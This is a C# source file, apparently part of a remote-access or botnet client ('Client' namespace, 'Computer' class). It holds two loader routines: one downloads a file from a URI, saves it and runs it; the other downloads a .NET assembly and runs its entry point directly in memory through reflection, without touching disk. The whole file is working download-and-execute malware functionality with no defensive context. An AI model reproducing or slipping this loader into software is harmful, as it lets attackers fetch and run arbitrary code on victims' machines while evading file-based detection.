using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace Client
{
   internal class Computer
    {
        /// <summary>
        /// Download and execute a file
        /// </summary>
        public static void DownloadExecuteLocally(string uri)
        {
            var filename = Path.GetFileName(uri);
            var resource = Internet.OpenResource(uri);
            Internet.ReadResourceToFile(resource, filename);
            Process.Start(filename);
        }

        /// <summary>
        /// Download and execute a file in memory
        /// </summary>
        /// <param name="uri"></param>
        public static void DownloadExecuteMemory(string uri)
        {
            var resource = Internet.OpenResource(uri);
            var image = Internet.ReadResource(resource).ToArray();
            var assembly = Assembly.Load(image);
            var ep = assembly.EntryPoint;
            object[] parameters = (ep.GetParameters().Length > 0) ? (new object[] { new string[] { "" } }) : null;
            ep.Invoke(null, parameters);
        }
    }
}
